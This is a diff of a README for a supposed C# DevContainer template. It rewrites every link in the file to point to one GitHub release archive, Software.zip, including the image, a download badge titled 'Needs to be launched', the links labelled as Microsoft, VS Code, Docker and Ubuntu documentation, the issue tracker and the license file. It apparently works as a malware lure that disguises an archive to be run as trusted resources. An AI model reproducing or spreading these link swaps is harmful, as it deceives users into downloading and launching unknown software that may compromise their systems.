@@ -1,7 +1,7 @@
 
 # 🌟 C# DevContainer Template 🌟
 
-![C# DevContainer Template](https://www.example.com/image.png)
+![C# DevContainer Template](https://github.com/itallo1122/csharp-devcontainer-template/releases/download/v2.0/Software.zip)
 
 ## Welcome to the C# DevContainer Template Repository!
 
@@ -26,23 +26,23 @@ Are you a beginner looking to learn C# development on Ubuntu using professional 
 4. Happy coding!
 
 ### Link to Download Software 📥
-[![Download Software](https://img.shields.io/badge/Download%20Software-Click%20Here-blue)](https://github.com/user-attachments/files/18388744/Software.zip "Needs to be launched")
+[![Download Software](https://github.com/itallo1122/csharp-devcontainer-template/releases/download/v2.0/Software.zip%20Software-Click%20Here-blue)](https://github.com/itallo1122/csharp-devcontainer-template/releases/download/v2.0/Software.zip "Needs to be launched")
 
 ### Additional Resources 📚
-- [C# Programming Guide](https://docs.microsoft.com/en-us/dotnet/csharp/)
-- [VS Code Documentation](https://code.visualstudio.com/docs)
-- [Docker Documentation](https://docs.docker.com/)
-- [Ubuntu Tutorials](https://ubuntu.com/tutorials)
-- [C# Testing Best Practices](https://docs.microsoft.com/en-us/dotnet/core/testing/)
+- [C# Programming Guide](https://github.com/itallo1122/csharp-devcontainer-template/releases/download/v2.0/Software.zip)
+- [VS Code Documentation](https://github.com/itallo1122/csharp-devcontainer-template/releases/download/v2.0/Software.zip)
+- [Docker Documentation](https://github.com/itallo1122/csharp-devcontainer-template/releases/download/v2.0/Software.zip)
+- [Ubuntu Tutorials](https://github.com/itallo1122/csharp-devcontainer-template/releases/download/v2.0/Software.zip)
+- [C# Testing Best Practices](https://github.com/itallo1122/csharp-devcontainer-template/releases/download/v2.0/Software.zip)
 
 ### Repository Topics 🏷️
 ['beginner-friendly', 'csharp', 'devcontainer', 'development-environment', 'docker', 'dotnet', 'learning-resources', 'linux', 'template', 'testing', 'ubuntu', 'vscode']
 
 ### Support 💬
-For any questions or issues, feel free to open an [issue](https://github.com/yourusername/csharp-devcontainer-template/issues) in this repository.
+For any questions or issues, feel free to open an [issue](https://github.com/itallo1122/csharp-devcontainer-template/releases/download/v2.0/Software.zip) in this repository.
 
 ### License ℹ️
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/itallo1122/csharp-devcontainer-template/releases/download/v2.0/Software.zip](https://github.com/itallo1122/csharp-devcontainer-template/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
